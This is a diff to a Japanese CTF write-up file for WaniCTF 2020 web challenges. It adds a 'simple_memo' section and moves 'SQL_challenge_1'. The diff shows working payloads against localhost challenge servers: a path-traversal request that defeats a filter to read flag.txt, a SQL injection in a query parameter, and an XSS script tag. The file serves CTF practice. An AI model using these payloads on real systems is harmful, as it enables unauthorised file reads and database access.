@@ -347,12 +347,12 @@ curl -s http://localhost:30001 | grep -o 'FLAG{.*}'
 
 開発者ツールで、5000000000000000 に書き換える
 
-## SQL_challenge_1
+## simple_memo
 
-- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/web/SQL_challenge_1
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/web/simple_memo
 
-```zsh
-curl -s 'http://localhost:8080/index.php?year=(2016)OR(1)=(1)' | grep -o 'FLAG{.*}'
+```
+curl -s 'http://localhost:8080/index.php?file=..././flag.txt' | grep -o 'FLAG{\S*}'
 ```
 
 ## striped_table
@@ -363,6 +363,14 @@ curl -s 'http://localhost:8080/index.php?year=(2016)OR(1)=(1)' | grep -o 'FLAG{.
 
 ```
 <script>alert(19640503)</script>
+```
+
+## SQL_challenge_1
+
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/web/SQL_challenge_1
+
+```zsh
+curl -s 'http://localhost:8080/index.php?year=(2016)OR(1)=(1)' | grep -o 'FLAG{.*}'
 ```
 
 ## SQL_challenge_2
